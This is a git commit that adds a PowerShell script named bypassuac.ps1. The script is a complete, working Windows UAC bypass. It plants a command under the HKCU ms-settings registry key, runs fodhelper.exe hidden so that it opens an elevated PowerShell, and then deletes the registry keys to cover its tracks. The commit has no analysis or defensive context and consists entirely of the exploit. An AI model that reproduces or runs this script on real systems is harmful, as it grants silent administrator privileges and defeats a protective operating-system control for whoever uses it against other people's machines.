0a1b2ccd0e4a727f307853f7d89769f52aec2f4a
JigolKa <82885673+JigolKa@users.noreply.github.com>
2022-01-22 17:07:55 +0100

    Add files via upload

---
+++ bypassuac.ps1
@@ -0,0 +1,13 @@
+
+
+    #Create registry structure
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start powershell.exe" -Force
+
+    #Perform the bypass
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+    #Remove registry structure
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
